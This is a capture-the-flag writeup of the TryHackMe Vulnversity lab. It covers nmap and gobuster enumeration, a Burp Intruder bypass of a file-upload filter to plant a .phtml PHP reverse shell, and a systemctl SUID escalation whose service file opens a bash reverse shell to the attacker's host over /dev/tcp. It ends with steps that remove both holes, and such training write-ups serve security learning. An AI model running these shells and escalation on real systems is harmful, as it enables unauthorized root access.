---
layout: post
title: "Vulnversity Writeup"
tagline: An intro to fullpwn using a reverse shell upload for user, with SUID root exploitation
author: GlitchGecko
tags:
- Writeup
- Fullpwn
- TryHackMe
- SUID
- Reverse Shell
- File Upload
- Nmap
- Gobuster
- Burpsuite
---
This writeup walks through exploiting the TryHackMe Vulnversity box using Nmap, gobuster, and burpsuite. Following the writeup, I also explain how this box could be secured to patch these vulnerabilities.
# Enumeration
## Nmap port discovery scan
Run this `nmap` command to quickly find what ports are listening: `sudo nmap [THM Machine IP] -g 53 -T5 -Pn --disable-arp-ping -vv -p-`
### Switch explanation
```bash
sudo               # Speeds up scan, makes it stealthier.
-g                 # Ports to send data from, I use 53 so it looks like DNS traffic.
-T5                # This speeds up the scan (but can result in false data)
--disable-arp-ping # Speeds up the scan slightly, also prevents errors
-v                 # Gives verbose results
-p-                # Scans all ports
```
### Port discovery results
```bash
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 61
22/tcp   open  ssh          syn-ack ttl 61
139/tcp  open  netbios-ssn  syn-ack ttl 61
445/tcp  open  microsoft-ds syn-ack ttl 61
3128/tcp open  squid-http   syn-ack ttl 61
3333/tcp open  dec-notes    syn-ack ttl 61
```
## Nmap port enumeration scan
Run this `nmap` command to find what exactly is running on each service. `sudo nmap [THM Machine IP] -g 53 -T5 -Pn --disable-arp-ping -vv -A -sV -p 21,22,139,445,3128,3333`
### Switch explanation
```bash
-vv # Extra verbose
-A  # Aggressive mode, enables OS and version detection and uses scripts to enumerate
```
### Enumeration scan results
```bash
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   _[      syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 61 Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
```
# User pwn
## Gobuster scan
First install gobuster (which isn't default on kali): `sudo apt-get install gobuster`

THM gives the used gobuster command, minus the wordlist: `gobuster dir -u http://[THM Machine IP]:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
### Switch explanation
```bash
dir # Uses directory/file enumeration mode
-u  # Sets target URL
-w  # Wordlist path
```
### Scan results
```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.137.135:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.137.135:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.137.135:3333/js/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.137.135:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.137.135:3333/internal/]
```
## Compromise web server
### Enumeration
**Make sure to set up burpsuite before starting this step**

- Test file uploads in `/internal/`
- Find an unblocked extension that can run a reverse shell (`.php`)
- Upload a file and capture that POST request in burpsuite
- `Right Click request` > `Send to Intruder`
- Create a wordlist for the extensions given by THM.
- Load the wordlist under `Payloads`
- Under positions, set `filename="shell.§php§"`
	- Note that these are not `$` signs
	- Also note that I put the `.` in a different position than THM does. This is because placing the `.` in the wordlist performs URL encoding which doesn’t work for some reason
- Performing this attack finds that `.phtml` is allowed

### Exploitation
- Download the given reverse php shell
- Set `$ip = '[Your Host IP]';` in the shell
	- Find your host IP by going to `10.10.10.10` while on the THM VPN
- Rename file to php-reverse-shell.phtml
- Listen to netcat connections with `nc -lvnp 1234`
- Upload shell and head to `http://[THM Machine IP]:3333/internal/uploads/php-reverse-shell.phtml`

### Exploration
#### Stabilize shell
Although this isn’t necessary for this challenge, it’s great practice and useful for future boxes, because you get more features like `CTRL + C`, tab autocomplete, more data, easier to read/understand, and better terminal control.

- In the remote shell, run `python -c 'import pty;pty.spawn("/bin/bash")'`
	- This spawns a bash shell with more features
- Then run `export TERM=xterm` to set the xterm emulator
- Now press `Ctrl+Z` to send the netcat shell to the background
- In your host, run `stty raw -echo; fg`
- Type `reset` and press enter
- Your shell has been stabilized!

#### Finding user account and password
- Run `ls /home` to see user accounts with a home directory
	- Use `cat /etc/passwd` to see all user accounts
- `/home/bill` and all files inside are world readable (which you can find with `ls -l`)
- This means we can just run `cat /home/bill/user.txt` for the flag

# Root pwn
## SUID Exploitation
Run the following command to search for SUID binaries:
```bash
find / -type f -perm -4000 ! -path "/proc/*" -exec ls {} 2</dev/null \;
```
### Results
```bash
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
### Exploitation
Head to [GTFOBins](https://gtfobins.github.io/) to search these binaries, revealing that `systemctl` is vulnerable.

- On your kali machine, open a new nc listener: `nc -lvnp 4444`
- Run this modified GTFOBins exploit (make sure to change IP):
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/[Your Host IP]/4444 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

#### Shell Stabilization
This uses the same steps as before
- `python -c 'import pty;pty.spawn("/bin/bash")'`
- `export TERM=xterm`
- `Ctrl+Z`
- `stty raw -echo; fg`
- `reset`

#### Root flag
- `cat /root/root.txt`

# Securing this server
Note that these steps should be completed on the root account
## Root security
- See `systemctl` perms with `ls -l /bin/systemctl`
- Fix the SUID bit with `chmod u-s /bin/systemctl`

## User security
- Enter the web directory with `cd /var/www/html/internal`
- Edit the web file with `nano index.php`
- Remove `phtml` from the vulnerable line: `$extensions= array("phtml");`
	- Save the file with `CTRL + X` then `Y` then `ENTER`

The machine is now secure!